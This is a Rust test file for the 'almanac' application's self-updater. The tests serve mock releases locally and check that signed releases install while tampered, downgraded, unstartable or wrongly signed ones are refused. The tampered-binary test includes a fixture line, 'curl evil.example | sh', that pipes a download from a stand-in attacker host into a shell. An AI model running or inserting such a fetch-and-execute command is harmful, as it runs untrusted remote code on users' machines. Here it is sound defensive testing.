//! End-to-end self-update against a local mock release host (M10,
//! AR19, AR22 — the L5 exit criterion).
//!
//! The releases below were signed once with a throwaway minisign key
//! whose secret half was never kept, so the test needs no minisign
//! binary and no key material at runtime. The public key here is
//! **not** the release key; it exists only to prove that a genuine
//! signature verifies and that a tampered one does not.
//!
//! The mock binaries are shell scripts rather than real builds, which
//! is exactly enough: what the updater cares about is that the file it
//! installed runs `--check` and exits successfully.

use std::collections::HashMap;
use std::path::{Path, PathBuf};

use almanac::core::update::Version;
use almanac::shell::notify::Notifier;
use almanac::shell::update::{Outcome, Updater};
use axum::Router;
use axum::extract::{Path as UrlPath, State};
use axum::http::StatusCode;

const PUBKEY: &str = "RWSD7EDZN4XNRaGibu+cfLqrMzCOC0pAyW/CCeNTg5A1BcZMfHalxTx4";

/// A release that starts cleanly.
const GOOD_BINARY: &str = "#!/bin/sh\nexit 0\n";
const GOOD_MANIFEST: &str =
    "306c6ca7407560340797866e077e053627ad409277d1b9da58106fce4cf717cb  almanac\n";
const GOOD_SIGNATURE: &str = "untrusted comment: signature from minisign secret key\nRUSD7EDZN4XNRWzTd/nVYZPGWVHFhAdBbUgEuUgnG8PNvVN24ZFFhkXVQRLam6HmQw9bcUwAMGbUi7Rgew5LWC0DGlLbmbcy9g8=\ntrusted comment: timestamp:1787940761\tfile:SHA256SUMS\thashed\nsR1goffxRR5oeoS6no0+GjFuKrSt4UannaugGwWSe5Ahv3f5bAmd7nCCRA/a/sYW5TO00kNiMYb2yXKigUm5CA==\n";

/// A correctly signed release that nevertheless cannot start on this
/// machine — the case AR22's `--check` probe exists for.
const UNSTARTABLE_BINARY: &str =
    "#!/bin/sh\necho \"needs a secret this machine does not have\" >&2\nexit 1\n";
const UNSTARTABLE_MANIFEST: &str =
    "8e28f4b357e430297837ba081d54cc88832f0fd799f2b812dffb7d9876dcb296  almanac\n";
const UNSTARTABLE_SIGNATURE: &str = "untrusted comment: signature from minisign secret key\nRUSD7EDZN4XNRZk3A9H0MS78ivQaUN8DH/+tN77PSSqI2RTawx+n6GepQHKL/+itpduRlqpgRHO/zXTjbQXlwQjoosNdyFTh+gE=\ntrusted comment: timestamp:1787940761\tfile:SHA256SUMS\thashed\nuivKQjKUXPaWjrax5I+7+bg71Nxm0uFAaXEOrs7QU4cGmVxdJgqRDJQTe3CHt2ay2ZbGdTI7KjXFQ9k+UknLCA==\n";

/// The bytes a running Almanac would have been started from.
const INSTALLED_BINARY: &str = "#!/bin/sh\nexit 0\n# the version that is running\n";

type Files = HashMap<String, String>;

/// Serves a release directory over HTTP on a loopback port.
async fn serve(files: Files) -> String {
    async fn file(
        State(files): State<std::sync::Arc<Files>>,
        UrlPath(path): UrlPath<String>,
    ) -> Result<String, StatusCode> {
        files.get(&path).cloned().ok_or(StatusCode::NOT_FOUND)
    }

    let router = Router::new()
        .route("/{*path}", axum::routing::get(file))
        .with_state(std::sync::Arc::new(files));

    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let address = listener.local_addr().unwrap();
    tokio::spawn(async move {
        axum::serve(listener, router).await.ok();
    });

    format!("http://{address}")
}

fn good_release() -> Files {
    HashMap::from([
        ("latest/download/VERSION".to_string(), "0.2.0".to_string()),
        (
            "download/v0.2.0/almanac".to_string(),
            GOOD_BINARY.to_string(),
        ),
        (
            "download/v0.2.0/SHA256SUMS".to_string(),
            GOOD_MANIFEST.to_string(),
        ),
        (
            "download/v0.2.0/SHA256SUMS.minisig".to_string(),
            GOOD_SIGNATURE.to_string(),
        ),
    ])
}

fn unstartable_release() -> Files {
    HashMap::from([
        ("latest/download/VERSION".to_string(), "0.2.0".to_string()),
        (
            "download/v0.2.0/almanac".to_string(),
            UNSTARTABLE_BINARY.to_string(),
        ),
        (
            "download/v0.2.0/SHA256SUMS".to_string(),
            UNSTARTABLE_MANIFEST.to_string(),
        ),
        (
            "download/v0.2.0/SHA256SUMS.minisig".to_string(),
            UNSTARTABLE_SIGNATURE.to_string(),
        ),
    ])
}

/// A directory with a "running" binary in it, standing in for
/// /opt/almanac.
fn install_dir(name: &str) -> PathBuf {
    let dir = std::env::temp_dir().join(format!(
        "almanac-selfupdate-{}-{}-{name}",
        std::process::id(),
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_nanos()
    ));
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(dir.join("almanac"), INSTALLED_BINARY).unwrap();
    dir
}

fn updater(base_url: &str, dir: &Path) -> Updater {
    Updater::new(
        reqwest::Client::new(),
        base_url,
        PUBKEY,
        dir.join("almanac"),
        dir.to_path_buf(),
        Version::parse("0.1.0").unwrap(),
        Notifier::disabled(),
    )
}

#[tokio::test]
async fn a_signed_release_is_verified_probed_and_installed() {
    let dir = install_dir("happy");
    let base = serve(good_release()).await;

    let outcome = updater(&base, &dir).check_once().await.unwrap();

    assert_eq!(
        outcome,
        Outcome::Installed {
            from: Version::parse("0.1.0").unwrap(),
            to: Version::parse("0.2.0").unwrap(),
        }
    );
    assert_eq!(
        std::fs::read_to_string(dir.join("almanac")).unwrap(),
        GOOD_BINARY,
        "the new binary must be in place"
    );
    assert_eq!(
        std::fs::read_to_string(dir.join("almanac.prev")).unwrap(),
        INSTALLED_BINARY,
        "the replaced binary is what a revert puts back — losing it would make AR23 impossible"
    );

    let state = almanac::shell::update::read_state(&dir).expect("an update must be on probation");
    assert_eq!(state.to_version, "0.2.0");
    assert_eq!(state.from_version, "0.1.0");
    assert_eq!(
        state.attempts, 0,
        "the process that installs does not count as the new version's attempt"
    );
    assert_eq!(
        state.previous_binary,
        dir.join("almanac.prev").display().to_string()
    );

    std::fs::remove_dir_all(&dir).ok();
}

#[tokio::test]
async fn a_tampered_binary_is_refused_and_nothing_is_replaced() {
    // The signature over the manifest is genuine; the binary the host
    // serves is not the one the manifest names. This is the exact
    // shape of a compromised release host.
    let dir = install_dir("tampered");
    let mut files = good_release();
    files.insert(
        "download/v0.2.0/almanac".to_string(),
        "#!/bin/sh\ncurl evil.example | sh\n".to_string(),
    );
    let base = serve(files).await;

    let error = updater(&base, &dir).check_once().await.unwrap_err();

    assert!(
        error
            .to_string()
            .contains("does not match the signed manifest")
    );
    assert!(error.remedy().contains("nothing was installed"));
    assert_eq!(
        std::fs::read_to_string(dir.join("almanac")).unwrap(),
        INSTALLED_BINARY,
        "the running binary must be exactly as it was"
    );
    assert!(!dir.join("almanac.new").exists());
    assert!(almanac::shell::update::read_state(&dir).is_none());

    std::fs::remove_dir_all(&dir).ok();
}

#[tokio::test]
async fn a_manifest_that_does_not_match_its_signature_is_refused_before_anything_is_downloaded() {
    let dir = install_dir("badsig");
    let mut files = good_release();
    // One byte of the manifest changed: enough to point the checksum
    // at an attacker's binary, and enough to break the signature.
    files.insert(
        "download/v0.2.0/SHA256SUMS".to_string(),
        GOOD_MANIFEST.replacen("306c", "306d", 1),
    );
    let base = serve(files).await;

    let error = updater(&base, &dir).check_once().await.unwrap_err();

    assert!(error.to_string().contains("signature does not verify"));
    assert!(
        error.remedy().contains("compromised") || error.remedy().contains("signing key"),
        "the remedy has to say what this actually means: {}",
        error.remedy()
    );
    assert_eq!(
        std::fs::read_to_string(dir.join("almanac")).unwrap(),
        INSTALLED_BINARY
    );

    std::fs::remove_dir_all(&dir).ok();
}

#[tokio::test]
async fn a_release_signed_by_a_different_key_is_refused() {
    // A valid minisign signature made with someone else's key. Without
    // the key check, "it has a signature" would be the whole security
    // model.
    let dir = install_dir("otherkey");
    let base = serve(good_release()).await;

    let error = Updater::new(
        reqwest::Client::new(),
        &base,
        // A syntactically valid public key that did not sign this.
        "RWSZiTdvjLmVIFdztyb3Hc/7lJtk/8gxNCMDgII5jQDLoFMxvVIXU8BF",
        dir.join("almanac"),
        dir.clone(),
        Version::parse("0.1.0").unwrap(),
        Notifier::disabled(),
    )
    .check_once()
    .await
    .unwrap_err();

    assert!(error.to_string().contains("does not verify"));
    assert_eq!(
        std::fs::read_to_string(dir.join("almanac")).unwrap(),
        INSTALLED_BINARY
    );

    std::fs::remove_dir_all(&dir).ok();
}

#[tokio::test]
async fn a_new_version_that_cannot_start_on_this_machine_is_not_installed() {
    // AR22: authentic, correctly signed, and still wrong — a version
    // that needs a secret Latch does not have yet. Catching this here
    // rather than after the swap is the difference between a skipped
    // update and an outage.
    let dir = install_dir("unstartable");
    let base = serve(unstartable_release()).await;

    let error = updater(&base, &dir).check_once().await.unwrap_err();

    assert!(error.to_string().contains("cannot start"));
    assert!(error.remedy().contains("--check"));
    assert_eq!(
        std::fs::read_to_string(dir.join("almanac")).unwrap(),
        INSTALLED_BINARY,
        "the working binary must still be the one on disk"
    );
    assert!(
        !dir.join("almanac.new").exists(),
        "the staged binary must be cleaned up, or the next attempt would run out of disk"
    );
    assert!(
        !dir.join("almanac.prev").exists(),
        "nothing was replaced, so there is nothing to revert to"
    );
    assert!(almanac::shell::update::read_state(&dir).is_none());

    std::fs::remove_dir_all(&dir).ok();
}

#[tokio::test]
async fn an_older_published_release_is_not_installed() {
    // A rolled-back or compromised release index serving a genuine,
    // correctly-signed old version with a known hole is a real attack.
    let dir = install_dir("downgrade");
    let mut files = good_release();
    files.insert("latest/download/VERSION".to_string(), "0.0.9".to_string());
    let base = serve(files).await;

    let outcome = updater(&base, &dir).check_once().await.unwrap();

    assert_eq!(outcome, Outcome::UpToDate(Version::parse("0.1.0").unwrap()));
    assert_eq!(
        std::fs::read_to_string(dir.join("almanac")).unwrap(),
        INSTALLED_BINARY
    );

    std::fs::remove_dir_all(&dir).ok();
}

#[tokio::test]
async fn the_same_version_does_not_reinstall_itself_on_every_check() {
    let dir = install_dir("same");
    let mut files = good_release();
    files.insert("latest/download/VERSION".to_string(), "0.1.0".to_string());
    let base = serve(files).await;

    assert_eq!(
        updater(&base, &dir).check_once().await.unwrap(),
        Outcome::UpToDate(Version::parse("0.1.0").unwrap())
    );

    std::fs::remove_dir_all(&dir).ok();
}

#[tokio::test]
async fn an_incomplete_release_is_an_error_rather_than_a_half_install() {
    // The manifest is there and signed, but the binary was never
    // uploaded — the most likely way a release goes wrong in practice.
    let dir = install_dir("incomplete");
    let mut files = good_release();
    files.remove("download/v0.2.0/almanac");
    let base = serve(files).await;

    let error = updater(&base, &dir).check_once().await.unwrap_err();

    assert!(error.to_string().contains("404"));
    assert_eq!(
        std::fs::read_to_string(dir.join("almanac")).unwrap(),
        INSTALLED_BINARY
    );

    std::fs::remove_dir_all(&dir).ok();
}

#[tokio::test]
async fn an_unreachable_release_host_leaves_the_service_alone() {
    // Self-update failing is not the service failing. The update check
    // runs in the background of a hub that is otherwise working fine.
    let dir = install_dir("unreachable");

    let error = updater("http://127.0.0.1:1", &dir)
        .check_once()
        .await
        .unwrap_err();

    assert!(error.remedy().contains("reachable"));
    assert_eq!(
        std::fs::read_to_string(dir.join("almanac")).unwrap(),
        INSTALLED_BINARY
    );

    std::fs::remove_dir_all(&dir).ok();
}

/// K19. The supervised install: same fetch, same verification, same
/// probe, but no probation state — because the homelab preserved its
/// own copy of the binary before calling `almanac update` and rolls
/// back from outside if the restart does not come up.
///
/// Writing state here would arm a second rollback competing with
/// theirs, and theirs is the one that can act on a process that never
/// starts. Two systems restoring binaries is exactly the collision that
/// kept `update_cmd` out of almanac's stack file until this existed.
#[tokio::test]
async fn a_supervised_install_leaves_the_rollback_to_the_supervisor() {
    let dir = install_dir("supervised");
    let base = serve(good_release()).await;

    let outcome = updater(&base, &dir)
        .supervised()
        .check_once()
        .await
        .unwrap();

    assert_eq!(
        outcome,
        Outcome::Installed {
            from: Version::parse("0.1.0").unwrap(),
            to: Version::parse("0.2.0").unwrap(),
        }
    );
    assert_eq!(
        std::fs::read_to_string(dir.join("almanac")).unwrap(),
        GOOD_BINARY,
        "the new binary must still be installed — only the bookkeeping differs"
    );
    assert_eq!(
        std::fs::read_to_string(dir.join("almanac.prev")).unwrap(),
        INSTALLED_BINARY,
        "the replaced binary is still kept; the supervisor is not the only copy"
    );
    assert!(
        almanac::shell::update::read_state(&dir).is_none(),
        "a supervised install must not arm almanac's own revert — the next start would \
         otherwise undo an update the supervisor is in the middle of verifying"
    );
}

/// And the unsupervised path must keep arming it, or AR23 quietly stops
/// working the day someone adds a flag.
#[tokio::test]
async fn an_unsupervised_install_still_arms_almanacs_own_revert() {
    let dir = install_dir("unsupervised");
    let base = serve(good_release()).await;

    updater(&base, &dir).check_once().await.unwrap();

    let state = almanac::shell::update::read_state(&dir)
        .expect("without a supervisor, almanac supervises itself");
    assert_eq!(state.to_version, "0.2.0");
}

/// K19. The explicit command must not depend on the unit's environment,
/// because the thing that runs it does not have it.
///
/// The homelab invokes `update_cmd` outside systemd, so the
/// `Environment=` lines that carry this deployment's release URL are
/// simply absent. Without the compiled-in fallback the command would
/// find no URL, report "not configured", exit 0, and change nothing —
/// and the supervisor would read that as a successful update. Almost
/// shipped exactly that.
#[test]
fn the_update_command_knows_where_releases_live_without_being_told() {
    assert!(
        almanac::shell::update::DEFAULT_RELEASE_URL.starts_with("https://"),
        "the fallback must be a real URL, not a placeholder"
    );
    assert!(
        almanac::shell::update::DEFAULT_RELEASE_URL.contains("almanac"),
        "and it must point at this project's releases"
    );
}
